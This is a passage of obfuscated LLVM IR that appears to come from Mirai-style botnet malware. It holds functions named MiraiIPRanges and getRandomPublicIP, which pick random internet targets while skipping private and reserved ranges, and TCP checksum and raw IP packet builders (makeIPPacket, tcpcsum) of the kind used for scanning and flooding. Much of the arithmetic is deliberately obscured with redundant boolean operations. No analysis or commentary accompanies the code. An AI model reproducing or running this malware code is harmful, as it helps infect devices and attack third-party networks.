  %105 = icmp eq i32 %104, 198
  br i1 %105, label %106, label %114

; <label>:106:                                    ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 51
  br i1 %109, label %110, label %114

; <label>:110:                                    ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 100
  br i1 %113, label %130, label %114

; <label>:114:                                    ; preds = %110, %106, %102
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 203
  br i1 %117, label %118, label %126

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 0
  br i1 %121, label %122, label %126

; <label>:122:                                    ; preds = %118
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 113
  br i1 %125, label %130, label %126

; <label>:126:                                    ; preds = %122, %118, %114
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp sge i32 %128, 224
  br label %130

; <label>:130:                                    ; preds = %126, %122, %110, %98, %94, %86, %78, %66, %54, %42, %34, %30, %18, %14
  %131 = phi i1 [ true, %122 ], [ true, %110 ], [ true, %98 ], [ true, %94 ], [ true, %86 ], [ true, %78 ], [ true, %66 ], [ true, %54 ], [ true, %42 ], [ true, %34 ], [ true, %30 ], [ true, %18 ], [ true, %14 ], [ %129, %126 ]
  br i1 %131, label %132, label %145

; <label>:132:                                    ; preds = %130
  %133 = call i32 @rand() #5
  %134 = srem i32 %133, 223
  %135 = trunc i32 %134 to i8
  store i8 %135, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %136 = call i32 @rand() #5
  %137 = srem i32 %136, 255
  %138 = trunc i32 %137 to i8
  store i8 %138, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %139 = call i32 @rand() #5
  %140 = srem i32 %139, 255
  %141 = trunc i32 %140 to i8
  store i8 %141, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %142 = call i32 @rand() #5
  %143 = srem i32 %142, 255
  %144 = trunc i32 %143 to i8
  store i8 %144, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:145:                                    ; preds = %130
  %146 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %146, i8 0, i64 16, i32 16, i1 false)
  %147 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %148 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %149 = zext i8 %148 to i32
  %150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %151 = zext i8 %150 to i32
  %152 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %153 = zext i8 %152 to i32
  %154 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %155 = zext i8 %154 to i32
  %156 = call i32 (i8*, i8*, ...) @szprintf(i8* %147, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.487, i32 0, i32 0), i32 %149, i32 %151, i32 %153, i32 %155)
  %157 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %158 = call i32 @inet_addr(i8* %157) #5
  ret i32 %158
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define i32 @MiraiIPRanges() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %154, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  br i1 %17, label %152, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %152, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 3
  br i1 %25, label %152, label %26

; <label>:26:                                     ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 15
  br i1 %29, label %152, label %30

; <label>:30:                                     ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 16
  br i1 %33, label %152, label %34

; <label>:34:                                     ; preds = %30
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 56
  br i1 %37, label %152, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 10
  br i1 %41, label %152, label %42

; <label>:42:                                     ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 192
  br i1 %45, label %46, label %50

; <label>:46:                                     ; preds = %42
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 168
  br i1 %49, label %152, label %50

; <label>:50:                                     ; preds = %46, %42
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 172
  br i1 %53, label %54, label %62

; <label>:54:                                     ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp sge i32 %56, 16
  br i1 %57, label %58, label %62

; <label>:58:                                     ; preds = %54
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp slt i32 %60, 32
  br i1 %61, label %152, label %62

; <label>:62:                                     ; preds = %58, %54, %50
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 100
  br i1 %65, label %66, label %74

; <label>:66:                                     ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp sge i32 %68, 64
  br i1 %69, label %70, label %74

; <label>:70:                                     ; preds = %66
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp slt i32 %72, 127
  br i1 %73, label %152, label %74

; <label>:74:                                     ; preds = %70, %66, %62
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 169
  br i1 %77, label %78, label %82

; <label>:78:                                     ; preds = %74
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp sgt i32 %80, 254
  br i1 %81, label %152, label %82

; <label>:82:                                     ; preds = %78, %74
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 198
  br i1 %85, label %86, label %94

; <label>:86:                                     ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp sge i32 %88, 18
  br i1 %89, label %90, label %94

; <label>:90:                                     ; preds = %86
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp slt i32 %92, 20
  br i1 %93, label %152, label %94

; <label>:94:                                     ; preds = %90, %86, %82
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 224
  br i1 %97, label %152, label %98

; <label>:98:                                     ; preds = %94
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 6
  br i1 %101, label %150, label %102

; <label>:102:                                    ; preds = %98
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 7
  br i1 %105, label %150, label %106

; <label>:106:                                    ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 11
  br i1 %109, label %150, label %110

; <label>:110:                                    ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 21
  br i1 %113, label %150, label %114

; <label>:114:                                    ; preds = %110
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 22
  br i1 %117, label %150, label %118

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 26
  br i1 %121, label %150, label %122

; <label>:122:                                    ; preds = %118
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 28
  br i1 %125, label %150, label %126

; <label>:126:                                    ; preds = %122
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 29
  br i1 %129, label %150, label %130

; <label>:130:                                    ; preds = %126
  %131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 30
  br i1 %133, label %150, label %134

; <label>:134:                                    ; preds = %130
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 33
  br i1 %137, label %150, label %138

; <label>:138:                                    ; preds = %134
  %139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %140 = zext i8 %139 to i32
  %141 = icmp eq i32 %140, 55
  br i1 %141, label %150, label %142

; <label>:142:                                    ; preds = %138
  %143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 214
  br i1 %145, label %150, label %146

; <label>:146:                                    ; preds = %142
  %147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 215
  br label %150

; <label>:150:                                    ; preds = %146, %142, %138, %134, %130, %126, %122, %118, %114, %110, %106, %102, %98
  %151 = phi i1 [ true, %142 ], [ true, %138 ], [ true, %134 ], [ true, %130 ], [ true, %126 ], [ true, %122 ], [ true, %118 ], [ true, %114 ], [ true, %110 ], [ true, %106 ], [ true, %102 ], [ true, %98 ], [ %149, %146 ]
  br label %152

; <label>:152:                                    ; preds = %150, %94, %90, %78, %70, %58, %46, %38, %34, %30, %26, %22, %18, %14
  %153 = phi i1 [ true, %94 ], [ true, %90 ], [ true, %78 ], [ true, %70 ], [ true, %58 ], [ true, %46 ], [ true, %38 ], [ true, %34 ], [ true, %30 ], [ true, %26 ], [ true, %22 ], [ true, %18 ], [ true, %14 ], [ %151, %150 ]
  br i1 %153, label %154, label %167

; <label>:154:                                    ; preds = %152
  %155 = call i32 @rand() #5
  %156 = srem i32 %155, 223
  %157 = trunc i32 %156 to i8
  store i8 %157, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %158 = call i32 @rand() #5
  %159 = srem i32 %158, 255
  %160 = trunc i32 %159 to i8
  store i8 %160, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %161 = call i32 @rand() #5
  %162 = srem i32 %161, 255
  %163 = trunc i32 %162 to i8
  store i8 %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %164 = call i32 @rand() #5
  %165 = srem i32 %164, 255
  %166 = trunc i32 %165 to i8
  store i8 %166, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:167:                                    ; preds = %152
  %168 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %168, i8 0, i64 16, i32 16, i1 false)
  %169 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %171 = zext i8 %170 to i32
  %172 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %173 = zext i8 %172 to i32
  %174 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %175 = zext i8 %174 to i32
  %176 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  %177 = zext i8 %176 to i32
  %178 = call i32 (i8*, i8*, ...) @szprintf(i8* %169, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.487, i32 0, i32 0), i32 %171, i32 %173, i32 %175, i32 %177)
  %179 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %180 = call i32 @inet_addr(i8* %179) #5
  ret i32 %180
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %5, -1
  %8 = xor i32 %6, -1
  %9 = xor i32 -2105939718, -1
  %10 = or i32 %7, %8
  %11 = or i32 -2105939718, %9
  %12 = xor i32 %10, -1
  %13 = and i32 %12, %11
  %14 = and i32 %5, %6
  store i32 %13, i32* %3, align 4
  %15 = load i32, i32* %3, align 4
  %16 = call i32 @rand_cmwc()
  %17 = load i32, i32* %2, align 4
  %18 = xor i32 %17, -1
  %19 = and i32 -1, %18
  %20 = xor i32 -1, -1
  %21 = and i32 %17, %20
  %22 = or i32 %19, %21
  %23 = xor i32 %17, -1
  %24 = xor i32 %16, -1
  %25 = xor i32 %22, -1
  %26 = xor i32 -1510112598, -1
  %27 = or i32 %24, %25
  %28 = or i32 -1510112598, %26
  %29 = xor i32 %27, -1
  %30 = and i32 %29, %28
  %31 = and i32 %16, %22
  %32 = xor i32 %15, -1
  %33 = and i32 %30, %32
  %34 = xor i32 %30, -1
  %35 = and i32 %15, %34
  %36 = or i32 %33, %35
  %37 = xor i32 %15, %30
  ret i32 %36
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %24

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, -3643250040264476109
  %16 = add i64 %15, %13
  %17 = sub i64 %16, -3643250040264476109
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  %19 = load i32, i32* %4, align 4
  %20 = sub i32 %19, 1383894116
  %21 = sub i32 %20, 2
  %22 = add i32 %21, 1383894116
  %23 = sub nsw i32 %19, 2
  store i32 %22, i32* %4, align 4
  br label %6

; <label>:24:                                     ; preds = %6
  %25 = load i32, i32* %4, align 4
  %26 = icmp sgt i32 %25, 0
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %24
  %28 = load i16*, i16** %3, align 8
  %29 = bitcast i16* %28 to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = load i64, i64* %5, align 8
  %33 = add i64 %32, -6487689141082478120
  %34 = add i64 %33, %31
  %35 = sub i64 %34, -6487689141082478120
  %36 = add i64 %32, %31
  store i64 %35, i64* %5, align 8
  br label %37

; <label>:37:                                     ; preds = %27, %24
  br label %38

; <label>:38:                                     ; preds = %42, %37
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = icmp ne i64 %40, 0
  br i1 %41, label %42, label %57

; <label>:42:                                     ; preds = %38
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = xor i64 65535, -1
  %46 = xor i64 -5537227870629689730, -1
  %47 = or i64 %44, %45
  %48 = or i64 -5537227870629689730, %46
  %49 = xor i64 %47, -1
  %50 = and i64 %49, %48
  %51 = and i64 %43, 65535
  %52 = load i64, i64* %5, align 8
  %53 = lshr i64 %52, 16
  %54 = sub i64 0, %53
  %55 = sub i64 %50, %54
  %56 = add i64 %50, %53
  store i64 %55, i64* %5, align 8
  br label %38

; <label>:57:                                     ; preds = %38
  %58 = load i64, i64* %5, align 8
  %59 = xor i64 %58, -1
  %60 = and i64 -1, %59
  %61 = xor i64 -1, -1
  %62 = and i64 %58, %61
  %63 = or i64 %60, %62
  %64 = xor i64 %58, -1
  %65 = trunc i64 %63 to i16
  ret i16 %65
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #5
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #5
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 -16, -1
  %15 = xor i8 %13, %14
  %16 = and i8 %15, %13
  %17 = and i8 %13, -16
  %18 = and i8 %16, 5
  %19 = xor i8 %16, 5
  %20 = or i8 %18, %19
  %21 = or i8 %16, 5
  store i8 %20, i8* %12, align 4
  %22 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %23 = bitcast %struct.iphdr* %22 to i8*
  %24 = load i8, i8* %23, align 4
  %25 = xor i8 15, -1
  %26 = xor i8 %24, %25
  %27 = and i8 %26, %24
  %28 = and i8 %24, 15
  %29 = xor i8 %27, -1
  %30 = xor i8 64, -1
  %31 = xor i8 -29, -1
  %32 = and i8 %29, -29
  %33 = and i8 %27, %31
  %34 = and i8 %30, -29
  %35 = and i8 64, %31
  %36 = or i8 %32, %33
  %37 = or i8 %34, %35
  %38 = xor i8 %36, %37
  %39 = or i8 %29, %30
  %40 = xor i8 %39, -1
  %41 = or i8 -29, %31
  %42 = and i8 %40, %41
  %43 = or i8 %38, %42
  %44 = or i8 %27, 64
  store i8 %43, i8* %23, align 4
  %45 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %46 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %45, i32 0, i32 1
  store i8 0, i8* %46, align 1
  %47 = load i32, i32* %10, align 4
  %48 = sext i32 %47 to i64
  %49 = sub i64 0, 20
  %50 = sub i64 0, %48
  %51 = add i64 %49, %50
  %52 = sub i64 0, %51
  %53 = add i64 20, %48
  %54 = trunc i64 %52 to i16
  %55 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %56 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %55, i32 0, i32 2
  store i16 %54, i16* %56, align 2
  %57 = call i32 @rand_cmwc()
  %58 = trunc i32 %57 to i16
  %59 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %60 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %59, i32 0, i32 3
  store i16 %58, i16* %60, align 4
  %61 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %62 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %61, i32 0, i32 4
  store i16 0, i16* %62, align 2
  %63 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %64 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %63, i32 0, i32 5
  store i8 -1, i8* %64, align 4
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %67 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %66, i32 0, i32 6
  store i8 %65, i8* %67, align 1
  %68 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %69 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %68, i32 0, i32 7
  store i16 0, i16* %69, align 2
  %70 = load i32, i32* %8, align 4
  %71 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %72 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %71, i32 0, i32 8
  store i32 %70, i32* %72, align 4
  %73 = load i32, i32* %7, align 4
  %74 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %75 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %74, i32 0, i32 9
  store i32 %73, i32* %75, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

